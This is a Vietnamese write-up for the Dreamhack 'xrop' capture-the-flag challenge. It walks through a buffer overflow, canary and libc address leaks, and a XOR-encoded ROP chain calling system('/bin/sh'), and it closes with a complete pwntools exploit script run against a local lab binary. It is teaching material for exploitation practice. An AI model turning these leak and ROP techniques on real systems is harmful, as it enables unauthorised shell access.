# Link Challenge Dreamhack
[xrop](https://dreamhack.io/wargame/challenges/1749)

# Phân tích code

<img width="712" height="450" alt="Screenshot 2026-10-25 164548" src="https://github.com/user-attachments/assets/f3383ac6-f5ab-4d96-a899-5e820fa85b5e" />

Chương trình này sẽ lặp lại `read` và `print` buf đến khi buf rỗng hoặc chỉ có chuỗi exit. Đồng thời có lỗ hổng *buffer overflow* ở hàm `read`.

Lưu ý sau khi read thì chương trình sẽ xor tất cả các BYTE trong buf theo nguyên tắc: BYTE hiện tại xor với BYTE liền kề sau.

xor so sánh các BITS: Khác nhau => 1  ngược lại giống nhau => 0

    INPUT:   0101 0001
    
    XOR với: 0001 1001
    
    Kết quả: 0100 1000


<img width="892" height="282" alt="image" src="https://github.com/user-attachments/assets/c71b4ab4-cc74-493d-bb2c-b4dff57c3052" />

Dựa trên trạng thái các cơ chế bảo vệ của chương trình thì trước tiên sẽ cần leak `Canary` và `Libc base`. 

    payload=b'U*'*12+b'U'        //leak canary
    p.sendafter(b'Input: ',payload)
    p.recvuntil(b'U')
    canary=u64(b'\x00'+p.recv(7))
    log.info('canary: '+(hex(canary)))

    payload=b'U*'*20             //leak libc 
    p.sendafter(b'Input: ',payload)
    p.recvuntil(b'*')
    libc_leak=u64(p.recv(6)+b'\x00\x00')
    libc.address=libc_leak-0x29d90
    log.info('libc.addr: '+(hex(libc.address)))

Xor sẽ làm các BYTES giống nhau trả về kết quả là BYTE NULL làm cắt chuỗi leak. Vì thế cần nhập payload là các cặp kí tự ngược BITS nhau 
để tạo thành BYTE khác NULL sau khi bị xor.

Sau đó chuẩn bị payload gọi `system('/bin/sh)`:

    pop_rdi=libc.address+0x000000000002a3e5
    pop_rsi=libc.address+0x000000000002be51
    ret=libc.address+0x0000000000029cd6
    
    payload=p64(0)*3
    payload+=p64(canary)
    payload+=p64(0)
    payload+=p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))
    payload+=p64(pop_rsi)+p64(0)
    payload+=p64(ret)
    payload+=p64(libc.sym['system'])
    payload+=p64(0)

Nếu nhập payload này vào buf ngay thì chắc chắn sẽ bị xor thành các BYTES rác. 

Hãy xem cách để khôi phục dữ liệu bị xor trước:

<img width="1231" height="857" alt="Screenshot 2026-10-25 174313" src="https://github.com/user-attachments/assets/7825b96e-9098-4ee4-831f-8bf64b928933" />

Nếu 1 giá trị bị xor 2 lần thì kết quả sau cùng là chính giá trị ban đầu. Vì thế để khôi phục dữ liệu bị xor bằng các BYTE kề sau thì cần xor ngược dữ liệu
từ cuối về đầu.

Khôi phục dữ liệu bị xor:

    array=list(payload)
    for i in range(0,86,1):
        j=87-i
        array[j-1]=array[j]^array[j-1]
    payload=bytes(array)
    
    p.sendafter(b'Input: ',payload)

<img width="1387" height="627" alt="Screenshot 2026-10-25 175527" src="https://github.com/user-attachments/assets/75a2baf5-8c5d-467f-bff2-70927d719977" />

Hệ quả của quá trình xor tạo ra 1 BYTE rác ở dầu buf. Để thoát vòng lặp thì ghi BYTE NULL vào để buf rỗng.

    payload=bytes.fromhex('00')
    p.sendafter(b'Input: ',payload)

<img width="1047" height="267" alt="Screenshot 2026-10-25 181337" src="https://github.com/user-attachments/assets/df2d9110-cb38-485c-a5d5-5cfb3a02f35f" />

## Script Python

    #!/usr/bin/env python3
    from pwn import *
    exe = ELF("./prob_patched",checksec=False)
    libc = ELF("./libc.so.6",checksec=False)
    ld = ELF("./ld-2.35.so",checksec=False)
    context.binary = exe
    p=process(exe.path)
    
    payload=b'U*'*12+b'U'
    p.sendafter(b'Input: ',payload)
    p.recvuntil(b'U')
    canary=u64(b'\x00'+p.recv(7))
    log.info('canary: '+(hex(canary)))
    
    payload=b'U*'*20
    p.sendafter(b'Input: ',payload)
    p.recvuntil(b'*')
    libc_leak=u64(p.recv(6)+b'\x00\x00')
    libc.address=libc_leak-0x29d90
    log.info('libc.addr: '+(hex(libc.address)))
    
    pop_rdi=libc.address+0x000000000002a3e5
    pop_rsi=libc.address+0x000000000002be51
    ret=libc.address+0x0000000000029cd6
    
    payload=p64(0)*3
    payload+=p64(canary)
    payload+=p64(0)
    payload+=p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))
    payload+=p64(pop_rsi)+p64(0)
    payload+=p64(ret)
    payload+=p64(libc.sym['system'])
    payload+=p64(0)
    
    array=list(payload)
    for i in range(0,86,1):
        j=87-i
        array[j-1]=array[j]^array[j-1]
    payload=bytes(array)
    
    p.sendafter(b'Input: ',payload)
    
    payload=bytes.fromhex('00')
    p.sendafter(b'Input: ',payload)
    
    p.interactive()




